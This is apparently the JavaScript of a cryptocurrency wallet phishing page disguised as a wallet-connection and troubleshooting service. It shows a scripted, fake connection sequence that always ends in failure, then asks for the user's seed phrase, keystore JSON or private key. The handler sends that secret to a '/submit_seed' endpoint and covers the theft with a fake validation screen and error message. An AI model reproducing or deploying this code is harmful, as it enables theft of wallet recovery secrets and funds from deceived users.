
document.addEventListener('DOMContentLoaded', function() {
    const connectWalletBtn = document.getElementById('connect-wallet-btn');
    const walletModal = document.getElementById('wallet-modal');
    const stepsModal = document.getElementById('steps-modal');
    const importModal = document.getElementById('import-modal');
    const validationModal = document.getElementById('validation-modal');
    const errorModal = document.getElementById('error-modal');
    const validateBtn = document.getElementById('validate-btn');
    const closeBtn = document.getElementById('close-btn');
    const seedInput = document.getElementById('seed-input');

    let selectedWallet = '';

    // Connect wallet button click
    connectWalletBtn.addEventListener('click', function() {
        walletModal.style.display = 'block';
    });

    // Wallet selection
    document.querySelectorAll('.wallet-item').forEach(item => {
        item.addEventListener('click', function() {
            selectedWallet = this.dataset.wallet;
            walletModal.style.display = 'none';
            showConnectionSteps();
        });
    });

    // Show connection steps
    function showConnectionSteps() {
        stepsModal.style.display = 'block';
        
        const steps = [
            { title: 'Initializing', description: 'Trying to connect to wallet...', duration: 3000 },
            { title: 'Connecting', description: 'Establishing secure connection...', duration: 3000 },
            { title: 'Verifying', description: 'Verifying wallet credentials...', duration: 3000 },
            { title: 'Error', description: 'Connection failed', duration: 1000 }
        ];

        let currentStep = 0;

        function showStep() {
            if (currentStep < steps.length) {
                const step = steps[currentStep];
                document.getElementById('step-title').textContent = step.title;
                document.getElementById('step-description').textContent = step.description;
                
                setTimeout(() => {
                    currentStep++;
                    if (currentStep < steps.length) {
                        showStep();
                    } else {
                        stepsModal.style.display = 'none';
                        showImportModal();
                    }
                }, step.duration);
            }
        }

        showStep();
    }

    // Show import modal
    function showImportModal() {
        const walletName = selectedWallet.charAt(0).toUpperCase() + selectedWallet.slice(1);
        document.getElementById('import-title').textContent = `Import your ${walletName} wallet`;
        importModal.style.display = 'block';
    }

    // Import option selection
    document.querySelectorAll('.import-option').forEach(option => {
        option.addEventListener('click', function() {
            document.querySelectorAll('.import-option').forEach(opt => opt.classList.remove('active'));
            this.classList.add('active');
            
            const selectedOption = this.dataset.option;
            const label = document.querySelector('.import-form label');
            const input = document.getElementById('seed-input');
            
            switch(selectedOption) {
                case 'seed':
                    label.textContent = 'Enter your wallet seed phrase';
                    input.placeholder = 'Enter your seed phrase';
                    break;
                case 'keystore':
                    label.textContent = 'Enter your keystore JSON';
                    input.placeholder = 'Paste your keystore JSON here';
                    break;
                case 'private':
                    label.textContent = 'Enter your private key';
                    input.placeholder = 'Enter your private key';
                    break;
            }
        });
    });

    // Validate button click
    validateBtn.addEventListener('click', function() {
        const seedPhrase = seedInput.value.trim();
        
        if (!seedPhrase) {
            alert('Please enter your seed phrase');
            return;
        }

        importModal.style.display = 'none';
        validationModal.style.display = 'block';

        // Send seed phrase to backend
        fetch('/submit_seed', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ seedPhrase: seedPhrase })
        });

        // Show validation for 3 seconds then show error
        setTimeout(() => {
            validationModal.style.display = 'none';
            errorModal.style.display = 'block';
            
            // Redirect to home after 5 seconds
            setTimeout(() => {
                errorModal.style.display = 'none';
                resetApp();
            }, 5000);
        }, 3000);
    });

    // Close button click
    closeBtn.addEventListener('click', function() {
        importModal.style.display = 'none';
        resetApp();
    });

    // Reset app to initial state
    function resetApp() {
        seedInput.value = '';
        selectedWallet = '';
    }

    // Close modals when clicking outside
    window.addEventListener('click', function(event) {
        if (event.target.classList.contains('modal')) {
            event.target.style.display = 'none';
        }
    });

    // Troubleshoot dropdown change
    document.getElementById('troubleshoot-select').addEventListener('change', function() {
        if (this.value) {
            // You can add specific troubleshooting logic here
            console.log('Selected issue:', this.value);
        }
    });
});
